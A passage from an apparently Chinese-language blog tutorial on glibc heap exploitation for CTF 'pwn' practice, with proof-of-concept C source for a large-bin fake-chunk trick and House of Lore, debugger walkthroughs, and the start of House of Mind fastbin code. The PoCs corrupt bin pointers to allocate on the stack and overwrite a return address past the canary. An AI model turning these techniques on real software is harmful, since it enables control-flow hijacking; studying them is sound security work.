vulnerability!!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, we&#x27;ve corrupted everything in just the right</span></span><br><span class="line"><span class="comment">	way so this should work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The purpose of the attack is to have a corrupted &#x27;bk&#x27; pointer</span></span><br><span class="line"><span class="comment">	point to ANYWHERE we want and still get the memory back. We do</span></span><br><span class="line"><span class="comment">	this by using the large bin code to write a size to the &#x27;bk&#x27;</span></span><br><span class="line"><span class="comment">	location.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This call to malloc (if you&#x27;re lucky), will return a pointer</span></span><br><span class="line"><span class="comment">	to the fake chunk that we created above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Make allocation of the size that the value will be written for.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once the allocation happens, the madness begins&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;write a fake &#x27;size&#x27; value to the location of our target.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After this, the target will have a valid size.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;size and remove it from the bin.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;With this, we have pulled out an arbitrary chunk!&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String before: %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String pointer: %p\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">	ptr = <span class="built_in">malloc</span>(alloc_size);</span><br><span class="line">	<span class="built_in">strncpy</span>(ptr, <span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47&quot;</span>, <span class="number">0x58</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String after %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk ptr: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-13"><a href="#调试-13" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194123520.png"
                      alt="image-20231010194123520"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194223371.png"
                      alt="image-20231010194223371"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194317515.png"
                      alt="image-20231010194317515"
                ></p>
<p>首先布置堆结构，<code>get_shift_amount()</code>函数计算 <code>fake_chunk_size</code> 偏移，这个偏移一般来说，开了 <code>PIE</code> 为 <code>5</code>，不开 <code>PIE</code> 为 <code>2</code>。<code>alloc_size</code> 在经过与 <code>0xffffffffffe(111111111111111111111111111111111110)</code>取与运算后，<code>PREV_INUSE</code>位将被置为<code>0</code>，然后减去 <code>0x10</code>后变为需要申请的用户大小<code>0x50</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010195052740.png"
                     
                ></p>
<p>这里判断 <code>alloc_size</code> 是否符合要求。与 <code>0x8(1000)</code> 取与运算不为 <code>0</code> 说明不是 <code>fast_chunk</code> 大小，不符合要求； 与 <code>0x4(0100)</code> 取与运算等于<code>0x4</code> 则说明 <code>NON_MAIN_ARENA </code> 位为 <code>1</code> ，不属于主堆区，不符合要求；与 <code>0x2(0010)</code> 取与运算不等于 <code>0x2(0010)</code> 则说明 <code>IS_MAPPED</code> 位不等于为 <code>1</code> ，符合要求（绕个弯子）。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200619889.png"
                      alt="image-20231010200619889"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200749723.png"
                      alt="image-20231010200749723"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200845852.png"
                      alt="image-20231010200845852"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201137929.png"
                      alt="image-20231010201137929"
                ></p>
<p>接下来申请 <code>largebin_chunk</code> ，并将<code>unsorted_bin</code> 和 <code>large_bin</code> 两个堆块都放入 <code>unsorted bin</code> 中。再次申请 <code>0x4e8</code> 大小堆块并释放，会将 <code>0x4e1</code> 大小的堆块放入 <code>large_bin</code>，将 <code>0x4f1</code> 大小的堆块放进 <code>unsorted bin</code>，满足 <code>unsortedbin_chunk &gt; largebin_chunk</code> 并且在大小在同一区域内。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201734234.png"
                      alt="image-20231010201734234"
                ></p>
<p>接下来完成任意地址申请，我们要控制 <code>target</code> 区域，在其 <code>fake_chunk=target-0x10</code> 位置申请。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201942670.png"
                      alt="image-20231010201942670"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010202458509.png"
                      alt="image-20231010202458509"
                ></p>
<p>构建如上图的堆结构，后面解释原因。</p>
<p>此时申请一个<code>0x50</code> 大小的堆块会经过以下两个变化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);<span class="comment">// bck==fake_chunk</span></span><br></pre></td></tr></table></figure></div>

<p>即 <code>unsorted_chunks(av)-&gt;bk = fake_chunk</code>;<code>fake_chunk+0x10(fake_chunk_fd) = unsorted_chunks(av)</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* unsortedbin_chunks_size &gt; largebin_chunks_size 将执行如下代码 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      victim-&gt;fd_nextsize = fwd; <span class="comment">//victim==unsortedbin_chunk; fwd == largebin_chunk;</span></span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>然后执行如上代码，<code>unsorted_chunk_bk_nextsize</code> 首先指向 <code>fake_chunk-0x18-2</code> ，然后  <code>unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize (fake_chunk-0x18-2+0x20)</code>  改为 <code>unsorted_chunk (此时fake_chunk的size被改为0x60)</code>。然后将 <code>bck(fake_chunk+0x8) </code>的 <code> fd(fake_chunk+0x8+0x10)</code> 指向 <code>unsorted_chunk</code>，伪造了 <code>fake_chunk_bk</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010204701287.png"
                      alt="image-20231010204701287"
                ></p>
<p> 最后成功向目标位置写入内容。</p>
<h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-14"><a href="#调试-14" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201716247.png"
                      alt="image-20231012201716247"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201759897.png"
                      alt="image-20231012201759897"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201828914.png"
                      alt="image-20231012201828914"
                ></p>
<p>首先申请一个 <code>0x110</code>大小的堆块，然后布置栈上两个 <code>stack_buffer</code> 结构，即 <code>stack1_fd-&gt;small_chunk</code>，<code>stack1_bk-&gt;stack2_prev</code> ，<code>stack2_fd-&gt;stack1_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211308891.png"
                      alt="image-20231012211308891"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211034680.png"
                      alt="image-20231012211034680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211530114.png"
                      alt="image-20231012211530114"
                ></p>
<p>申请<code>0x3f0</code> 大小的 <code>chunk</code> 隔离 <code>top_chunk</code> ，然后将 <code>0x111</code> 的 <code>chunk</code> 放进 <code>unsorted_bin</code> ，申请 <code>（large_chunk）0x4c0</code> 大小的 <code>chunk</code> 触发 <code>consolidate</code> 机制再次将其再次放入 <code>small_bin</code> 中，并修改其 <code>bk-&gt;stack1_prev</code>。</p>
<p>此时：</p>
<p>FD：<code>stack2_fd-&gt;stack1_prev;stack1_fd-&gt;small_chunk_fd;</code></p>
<p>BK：<code>small_chunk_bk-&gt;stack1_prev;stack1_bk-&gt;stack2_prev;</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第二种情况，small bin 中存在空闲的 chunk。</span></span><br><span class="line"><span class="comment">// 找到倒数第二个 chunk(small_chunk)-&gt;bk。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line"><span class="built_in">set_inuse_bit_at_offset</span>(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure></div>

<p>然后再次申请两个用户区为 <code>0x100</code>大小的 <code>chunk</code>，第一次申请时绕过以上验证，此时 <code>bck(stack1)_fd-&gt;small_chunk。</code>，第二次申请同理，要取出 <code>victim=stack1</code> ，此时 <code>stack_2_fd-&gt;stack_1_prev; stack1_bk-&gt;stack2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085422164.png"
                      alt="image-20231013085422164"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085545532.png"
                      alt="image-20231013085545532"
                ></p>
<p>然后申请两次 <code>0x110</code> 大小的 <code>chunk</code>，分别为 <code>p3</code> <code>p4</code>，会将 <code>small_chunk</code>  和 <code>stack1</code> 取出来，然后覆盖 <code>main</code> 返回地址为目标函数地址即可完成任意地址写。</p>
<h2 id="house-of-mind-fastbin"><a href="#house-of-mind-fastbin" class="headerlink" title="house_of_mind_fastbin"></a>house_of_mind_fastbin</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span 